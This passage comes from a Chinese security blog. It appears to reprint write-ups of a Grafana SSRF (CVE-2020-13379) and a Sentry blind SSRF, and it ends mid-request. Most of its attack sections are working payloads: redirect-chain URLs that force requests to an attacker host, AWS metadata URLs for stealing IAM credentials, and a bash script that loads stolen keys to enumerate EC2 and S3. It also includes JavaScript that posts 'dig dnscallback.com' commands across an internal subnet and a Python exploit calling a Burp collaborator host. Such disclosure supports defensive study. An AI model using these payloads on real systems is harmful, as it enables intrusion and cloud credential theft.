+<p>i0.wp.com中的URL链接构造为**i0.wp.com&#x2F;{domainOfImage}&#x2F;{pathOfImage}*<em>，该URL链接的目的在于，i0.wp.com依托.bp.blogspot.com域名存储了自身的一部份图片，因此，i0.wp.com还会继续形成对</em>.bp.blogspot.com的跳转。后经我花费了几个小时的测试，发现利用以下链接可在该跳转中形成一个开放重定向跳转：</p>
+<p><code>http://i0.wp.com/google.com?;/1.bp.blogspot.com/</code></p>
+<p>最终，综合两个跳转，可以在Grafana后台形成以下跳转链接：</p>
+<p><code>https://grafanaHost/avatar/test?d=google.com%3f;/bp.blogspot.com</code></p>
+<p>在以上链接中，Grafana后台会获取<strong>test?d&#x3D;google.com%3f;&#x2F;bp.blogspot.com</strong>作为**:hash**值。</p>
+<p>回到前述的d参数场景中，在以下链接中加入d参数：</p>
+<p><code>https://secure.gravatar.com/avatar/anything?d=google.com%3f;/1.bp.blogspot.com/</code></p>
+<p>该请求会发生一个到i0.wp.com的跳转，成为：</p>
+<p><code>http://i0.wp.com/google.com%3f%;/1.bp.blogspot.com/</code></p>
+<p>然后，i0.wp.com会继续发生指向google.com的跳转，成为：</p>
+<p><code>https://google.com?;/1.bp.blogspot.com</code></p>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115"><strong>用户头像avatar的源码文件</strong></a>中可以看到，其中具备内容类型属性信息<strong>Content-Type: image&#x2F;jpeg</strong>，以及请求后的相关响应机制：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> avatar.Expired() &#123;</span><br><span class="line"> <span class="comment">// The cache item is either expired or newly created, update it from the server</span></span><br><span class="line"> <span class="keyword">if</span> err := avatar.Update(); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;avatar update error: %v&quot;</span>, err)</span><br><span class="line">  avatar = <span class="built_in">this</span>.notFound</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> avatar.notFound &#123;</span><br><span class="line"> avatar = <span class="built_in">this</span>.notFound</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> !exists &#123;</span><br><span class="line"> <span class="keyword">if</span> err := <span class="built_in">this</span>.cache.Add(hash, avatar, gocache.DefaultExpiration); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;Error adding avatar to cache: %s&quot;</span>, err)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !setting.EnableGzip &#123;</span><br><span class="line"> ctx.Resp.Header().Add(<span class="string">&quot;Content-Length&quot;</span>, strconv.Itoa(len(avatar.data.Bytes())))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;private, max-age=3600&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := avatar.Encode(ctx.Resp); err != nil &#123;</span><br><span class="line"> log.Warn(<span class="string">&quot;avatar encode error: %v&quot;</span>, err)</span><br><span class="line"> ctx.WriteHeader(<span class="number">500</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此，综上所述的各种技术利用点，可以构造出以下成功的SSRF运行链接，让Grafana后台服务器发起对YOURHOSTHERE的请求。</p>
+<p><code>https://grafanaHost/avatar/test?d=redirect.rhynorater.com?;/bp.blogspot.com/YOURHOSTHERE</code></p>
+<p>该漏洞影响的不仅只是Grafana的产品实例，而且其在<strong>Gitlab（&#x2F;-&#x2F;grafana）和SourceTree（&#x2F;-&#x2F;debug&#x2F;grafana&#x2F;）</strong>上的源码实例也受影响。</p>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>正如<a target="_blank" rel="noopener" href="https://www.hackerone.com/hacktivitycon">我在HackerOne的HacktivityCon会上所说的</a>, 该漏洞有多个有意思的利用点。接下来，我就来分享一下具体的漏洞利用方式。</p>
+</blockquote>
+<h3><span id="漏洞利用1-对grafana项目云实例元数据api的操控访问manipulate-awsx2fcloud-metadata-apis">漏洞利用1-对Grafana项目云实例元数据API的操控访问（Manipulate AWS&#x2F;Cloud Metadata APIs）</span></h3><blockquote>
+<p>现代SSRF漏洞的一种流行利用就是用它去执行对目标系统云上元数据API接口的访问，以从中获得相关敏感信息。元数据API接口大多都是AWS的云形式，我们可以设法从中获取到Grafana项目EC2实例中的用户身份验证授权凭证（IAM），然后以此横向渗透到组织机构内网。迄今为止，攻击者已经利用此种SSRF利用方法渗透入侵，导致了一些大规模的数据泄露事件。</p>
+<p>作为攻击者来说，主要关心的就是尝试从公开的AWS元数据服务器（169.254.169.254）中，用以下访问链接获取用户IAM凭证：</p>
+<p><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE（实例项目名称）</code></p>
+<p>成功获取的用户IAM凭证内容如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-15T18:13:44Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ASIAN0P3n0W4y1nv4L1d&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A5tGuw2QXjmqu8cTEu1zs0Dw8yt905HDCzrF0AdE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AgoJb3JpZ2luX2VjEJv//////////wEaCXVzLWVhc3QtMSJHMEUCIEX46oh4kz6AtBiTfvoHGqfVuHJI29ryAZy/wXyR51SAiEA04Pyw9HSwSIRNx6vmYpqm7sD+DkLQiFzajuwI2aLEp4q8gMIMxABGgwzNjY4OTY1NTU5NDkiDOBEJDdUKxKUkgkhGyrPA7u8oSds5hcIM0EeoHvgxvCX/ChiDsuCEFO1ctMpOgaQuunsvKLzuaTp/86V96iZzuoPLnpHHsmIUTrCcwwGqFzyaqvJpsFWdv89YIhARAMlcQ1Cc9Cs4pTBSYc/BvbEFb1z0xWqPlBNVKLMzm2K5409f/KCK/eJsxp530Zt7a1MEBp/rvceyiA5gg+6hOu65Um+4BNT+CjlEk3gwL6JUUWr9a2LKYxmyR4fc7XtLD2zB0jwdnG+EPv7aDPj7EoWMUoR/dOQav/oSHi7bl6+kT+koKzwhU/Q286qsk0kXMfG/U95TdUr70I3b/L/dhyaudpLENSU7uvPFi8qGVGpnCuZCvGL2JVSnzf8327jyuiTF7GvXlvUTh8bjxnZ8pAhqyyuxEW1tosL2NuqRHmlCCfnE3wLXJ0yBUr7uxMHTfL1gueEWghymIGhAxiYIKA9PPiHCDrn4gl5AGmLyzqxenZgcNnuwMjeTnhQ0mVf7L8PR4ZWRo9h3C1wMbYnYNi5rdfQcByMIN/XoR2J74sBPor/aObMMHVnmpNjbtRgKh0Vpi48VgXhXfuCAHka3rbYeOBYC8z8nUWYJKuxv3Nj0cQxXDnYT6LPPXmtHgZaBSUwxMHW6gU6tAHi8OEjskLZG81wLq1DiLbdPJilNrv5RPn3bBF+QkkB+URAQ8NBZA/z8mNnDfvESS44fMGFsfTIvIdANcihZQLo6VYvECV8Vw/QaLP/GbljKPwztRC5HSPe6WrC06LZS9yeTpVGZ6jFIn1O/01hJOgEwsK7+DDwcXtE5qtOynmOJiY/iUjcz79LWh184My58ueCNxJuzIM9Tbn0sH3l1eBxECTihDNbL13v5g+8ENaih+f3rNU=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-16T00:33:31Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>有了这个IAM凭证，我们就能通过用户身份验证这一关，以内部用户身份执行对EC2实例和S3存储桶的任意访问。如果要用IAM来执行深入的用户验证测试危害证明，我推荐使用<a target="_blank" rel="noopener" href="https://github.com/nccgroup/Scout2">NCCGroup安全团队的Scout2工具</a>，不过由于它会产生大量的请求响应，而且会引发一系列的密钥轮换数据，有点太过于Noisy了。这里我还是用以下标准输入的脚本方式来利用上述IAM凭证吧：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">out=$(<span class="built_in">cat</span> -)</span><br><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .AccessKeyId | sed <span class="string">&#x27;s/&quot;//g&#x27;</span> )</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .SecretAccessKey | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">export</span> AWS_DEFAULT_REGION=us-east-1</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .Token | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Profile loaded!&quot;</span></span><br><span class="line">aws sts get-caller-identity</span><br><span class="line">aws ec2 describe-instances &gt; ec2Instances.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;EC2 Instances outputted to \&quot;ec2Instances.txt\&quot;!&quot;</span></span><br><span class="line">aws s3api list-buckets &gt; s3Buckets.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;S3 Buckets outputted to \&quot;s3Buckets.txt\&quot;!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过AWS公开的元数据服务器访问链接<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/user-data%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BB%8E%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9B%AE%E6%A0%87%E5%AE%9E%E4%BE%8B%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BE%88%E5%A4%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%99%BD%E7%84%B6[AWS%E6%96%87%E6%A1%A3](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)%E4%B8%80%E5%86%8D%E5%A3%B0%E7%A7%B0%E4%B8%8D%E8%A6%81%E5%9C%A8%E8%AF%A5%E5%AE%9E%E4%BE%8B%E4%BD%8D%E7%BD%AE%E5%AD%98%E5%82%A8%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E4%BB%A5%E7%BB%8F%E9%AA%8C%E6%9D%A5%E7%9C%8B%EF%BC%8C%E4%B9%8B%E5%89%8D%E6%88%91%E8%BF%98%E6%98%AF%E4%BB%8E%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%8E%B7%E5%8F%96%E4%BA%86%E5%A4%A7%E9%87%8FK8S">http://169.254.169.254/latest/user-data，我们可以从中获取到目标实例相关的很多敏感信息，虽然[AWS文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)一再声称不要在该实例位置存储凭证信息，但以经验来看，之前我还是从中发现获取了大量K8S</a> Secrets、IAM Credentials、SSL Certificates、GitHub Credentials等密钥数据。<br>另外，我们还能从另外一个AWS路径中获取有用信息：</p>
+<p><code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>
+</blockquote>
+<h3><span id="漏洞利用2-图片渲染过程导致的blind-ssrf">漏洞利用2-图片渲染过程导致的Blind SSRF</span></h3><blockquote>
+<p>Grafana实例内部会发生大量的图片渲染过程，因此攻击者可以向其中以Headless Chrome实例方式（非Chrome环境中运行Chrome），构造包含超时变量的HTML页面，以此为据点，实施长期的内网RCE攻击尝试。</p>
+<p>同样，我们利用CVE-2020-13379的SSRF漏洞，还能执行内网端口扫描探测，比如，在Grafana的通用实例中会有一个3001端口，用该SSRF方法可以成功探测到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 22</span><br><span class="line">ETag: W/&quot;16-NipK4Bud1bhsozqKdmj9bWnwGTg&quot;</span><br><span class="line">Date: Wed, 29 Jul 2020 11:21:31 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Grafana Image Renderer</span><br></pre></td></tr></table></figure>
+
+<p>基于此，攻击者可以精心构造，让Grafana实例系统通过以下链接执行危险操作：</p>
+<p><code>localhost:3001/render?url=http://yourhost&amp;domain=a&amp;renderKey=a&amp;timeout=30</code></p>
+<p>这里，我编写了以下HTML文件进行一个自动化快速的漏洞利用，用它可以进行RCE提权攻击。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">postData</span>(<span class="params">url = <span class="string">&#x27;&#x27;</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">postData</span>(<span class="string">&#x27;http://10.0.0.&#x27;</span>+i+<span class="string">&#x27;/oneshotrce&#x27;</span>, &#123; <span class="attr">cmd</span>: <span class="string">&#x27;dig dnscallback.com&#x27;</span> &#125;)</span><br><span class="line">&#125;               </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞利用3-操控gitlab的-prometheus-redis导出器">漏洞利用3-操控Gitlab的 Prometheus Redis导出器</span></h3><blockquote>
+<p>Prometheus 是一个开源的服务监控系统和时间序列数据库。之前我们已经提到过，该漏洞还会对版本&lt;13.1.1的Grafana Gitlab实例产生影响。根据Gitlab说明文档介绍，Grafana Gitlab实例 9.0版本开始，其Prometheus和导出器（Exporter）都是默认开启的，恰巧这些导出器可以成为攻击者利用CVE-2020-13379的突破口，其中一个导出器即是Redis Exporter，其路径为**<a href="http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=%5C***%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8target%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0%EF%BC%8C%E9%80%9A%E8%BF%87%E8%AF%A5%E8%B7%AF%E5%BE%84%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BDredis%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E3%80%82">http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=\***，攻击者利用target参数构造，通过该路径可以下载redis服务器中的所有密钥信息。</a></p>
+</blockquote>
+<h3><span id="漏洞利用4-image-only-ssrf-gt-full-read-ssrf">漏洞利用4- Image-Only SSRF -&gt; Full-Read SSRF</span></h3><blockquote>
+<p>在Grafana**<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115">开源文件avatar.go的第104行</a>**中，其对该SSRF响应内容类型（Content Type）为image&#x2F;jpeg，这就给了我们基于该SSRF漏洞，综合利用其它漏洞的独特机会。假设我们有以下场景：<code>example.com/fetchImage.php?image=http://localhost/image.png</code></p>
+<p>其fetchImage.php中的代码向请求目标发送了一个HTTP请求，然后会检查其内容类型（Content Type）是否为image&#x2F;jpeg，如果是就返回请求内容。因此，如果某个内部Grafana实例存在我们这里的CVE-2020-13379漏洞，那么攻击者可以构造以下链接形成一个内容读取型的SSRF漏洞攻击：<code>example.com/fetchImage.php?image=http://internalgrafana/avatar/.../169.254.169.254</code></p>
+<p>由于返回内容需要是image&#x2F;jpeg，因此它会执行一个content-type验证。另外，因为这是一个图像方式SSRF触发的读取型SSRF，而且攻击者可以控制其中的链接跳转，所以，攻击者还可把它用于文件扩展名检查欺骗。</p>
+</blockquote>
+<h2><span id="总结">总结</span></h2><blockquote>
+<p>该漏洞发现其实并不复杂，有意思的是Grafana内部HTTP请求发生时，读取 :hash时的参数注入问题，但无论如何，其漏洞影响非常严重，且其漏洞利用非常稳定有效。以下是我的几点心得：</p>
+<p>1、在源码检查时，首先去考虑未授权路径，其次是授权绕过；</p>
+<p>2、如果在开源应用中发现了某些有意思的功能，那相对于“黑盒测试”来说，可以针对该功能花心思测试测试，至少你能以开源方式获取更多数据，并能把你的“漏洞嗅觉”派上用场；</p>
+<p>3、针对0-day漏洞的挖掘可能会激发你的动力；</p>
+<p>4、有些公司不会为他们的0-day漏洞买单，</p>
+<p>5、自己发现漏洞后，可以和值得依赖的朋友分享，让他们也帮助看看是否能进行更深入的漏洞利用；</p>
+<p>6、这是我的一个漏洞报告模板工具，欢迎参考-<a target="_blank" rel="noopener" href="https://github.com/rhynorater/reports">https://github.com/rhynorater/reports</a></p>
+</blockquote>
+<h2><span id="参考来源">参考来源</span></h2><p><a target="_blank" rel="noopener" href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">rhynorater</a></p>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/Sentry-SSRF/">
+                Sentry SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
+</blockquote>
+<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
+<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
+</blockquote>
+<h2><span id="exp-testing">exp testing</span></h2><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
+
+<p>然后去你到dnslog看看有没有请求记录即可。</p>
+<p>exp源码参考：<br>配置如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span 